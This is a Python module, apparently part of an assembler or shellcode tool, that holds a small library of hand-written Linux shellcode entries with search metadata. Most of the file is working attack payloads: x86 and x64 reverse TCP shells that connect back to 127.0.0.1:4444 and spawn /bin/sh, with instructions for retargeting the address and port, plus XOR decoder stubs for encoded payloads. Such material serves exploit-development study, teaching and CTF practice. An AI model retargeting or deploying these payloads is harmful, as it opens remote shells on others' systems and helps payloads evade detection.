"""A small set of hand-written reference shellcode and decoder stubs.

These are hand-written reference implementations inspired by the Metasploit
payload families (not copied verbatim); they assemble in-tool and load as
editable assembly. Network payloads default to 127.0.0.1:4444 and the XOR
stubs to key 0xaa; edit the constants as needed. The bulk of the library's
entries are generated from pwntools (see pwn_catalog.py).

Each entry carries metadata for the library page's search and sort: arch, os,
category (functionality), kind (payload or decoder) and source.
"""

from .engine import Arch, assemble_lines

# execve("/bin/sh") tails reused by the reverse-shell entries.
_X86_EXECVE = """\
  xor eax, eax
  push eax
  push 0x68732f2f       // "//sh"
  push 0x6e69622f       // "/bin"
  mov ebx, esp          // ebx -> "/bin//sh"
  push eax              // argv terminator
  push ebx
  mov ecx, esp          // ecx -> argv
  xor edx, edx          // envp = NULL
  mov al, 0x0b          // __NR_execve
  int 0x80"""

_X64_EXECVE = """\
  xor rdx, rdx          // envp = NULL
  mov rbx, 0x68732f2f6e69622f   // "/bin//sh"
  push rbx
  mov rdi, rsp          // rdi -> "/bin//sh"
  push rdx              // argv terminator
  push rdi
  mov rsi, rsp          // rsi -> argv
  push 0x3b             // __NR_execve
  pop rax
  syscall"""


LIBRARY = [
    {
        "id": "x86-linux-reverse-tcp",
        "name": "reverse TCP shell 127.0.0.1:4444",
        "arch": "x86", "os": "linux",
        "category": "reverse shell", "kind": "payload", "source": "Metasploit",
        "description": "Linux x86 connect-back shell (socketcall). Edit the "
                       "0x0100007f address and 0x5c11 port to retarget.",
        "address": 0x1000,
        "asm": """\
  xor eax, eax
  xor ebx, ebx
  // socket(AF_INET, SOCK_STREAM, 0)
  push eax
  push byte 0x1
  push byte 0x2
  mov ecx, esp
  mov bl, 0x1           // SYS_SOCKET
  mov al, 0x66          // socketcall
  int 0x80
  mov edx, eax          // save sockfd
  // connect(fd, {AF_INET, 4444, 127.0.0.1}, 16)
  push 0x0100007f       // 127.0.0.1
  push word 0x5c11      // port 4444
  push word 0x2         // AF_INET
  mov ecx, esp
  push byte 0x10
  push ecx
  push edx
  mov ecx, esp
  mov bl, 0x3           // SYS_CONNECT
  mov al, 0x66
  int 0x80
  // dup2(sockfd, 0..2)
  mov ebx, edx
  xor ecx, ecx
  mov cl, 0x2
dup_loop:
  mov al, 0x3f          // __NR_dup2
  int 0x80
  dec ecx
  jns dup_loop
""" + _X86_EXECVE,
    },
    {
        "id": "x86-linux-xor-decoder",
        "name": "XOR decoder stub",
        "arch": "x86", "os": "linux",
        "category": "decoder", "kind": "decoder", "source": "Metasploit",
        "description": "Self-locating XOR decoder (key 0xaa). Set the length "
                       "byte and append the encoded payload after 'encoded:'.",
        "address": 0x1000,
        "asm": """\
  jmp get_addr
decode:
  pop esi               // esi -> encoded payload
  xor ecx, ecx
  mov cl, 0x00          // length of encoded payload
decode_loop:
  xor byte ptr [esi], 0xaa   // key
  inc esi
  loop decode_loop
  jmp encoded
get_addr:
  call decode
encoded:
  // encoded shellcode goes here""",
    },
    {
        "id": "x64-linux-reverse-tcp",
        "name": "reverse TCP shell 127.0.0.1:4444",
        "arch": "x64", "os": "linux",
        "category": "reverse shell", "kind": "payload", "source": "Metasploit",
        "description": "Linux x64 connect-back shell. Edit the packed "
                       "0x0100007f5c110002 sockaddr (family/port/address) to retarget.",
        "address": 0x1000,
        "asm": """\
  // socket(AF_INET, SOCK_STREAM, 0)
  push 0x29             // __NR_socket
  pop rax
  xor edx, edx
  push 2
  pop rdi
  push 1
  pop rsi
  syscall
  mov rdi, rax          // sockfd
  // connect(fd, {AF_INET, 4444, 127.0.0.1}, 16)
  mov rcx, 0x0100007f5c110002
  push rcx
  mov rsi, rsp
  push 16
  pop rdx
  push 0x2a             // __NR_connect
  pop rax
  syscall
  // dup2(sockfd, 0..2)
  push 3
  pop rsi
dup_loop:
  dec rsi
  push 0x21             // __NR_dup2
  pop rax
  syscall
  jne dup_loop
""" + _X64_EXECVE,
    },
    {
        "id": "x64-linux-xor-decoder",
        "name": "XOR decoder stub",
        "arch": "x64", "os": "linux",
        "category": "decoder", "kind": "decoder", "source": "Metasploit",
        "description": "Self-locating XOR decoder (key 0xaa). Set the length "
                       "byte and append the encoded payload after 'encoded:'.",
        "address": 0x1000,
        "asm": """\
  jmp get_addr
decode:
  pop rsi               // rsi -> encoded payload
  xor rcx, rcx
  mov cl, 0x00          // length of encoded payload
decode_loop:
  xor byte ptr [rsi], 0xaa   // key
  inc rsi
  loop decode_loop
  jmp encoded
get_addr:
  call decode
encoded:
  // encoded shellcode goes here""",
    },
]


def _size(arch: Arch, asm: str, address: int) -> int | None:
    """Assembled byte length, or None if any line fails to assemble."""
    results = assemble_lines(arch, asm.splitlines(), address)
    if not all(r["ok"] for r in results):
        return None
    return sum(len(bytes.fromhex(r["bytes"])) for r in results)


def catalog() -> list[dict]:
    """The full library for the API: hand-written entries (loaded as
    assembly) plus pwntools-generated entries (loaded as raw bytes)."""
    from . import pwn_catalog

    out = []
    for entry in LIBRARY:
        out.append({
            **entry,
            "size": _size(entry["arch"], entry["asm"], entry["address"]),
            "load": "asm",
            "preview": entry["asm"],
        })
    out.extend(pwn_catalog.entries())
    return out
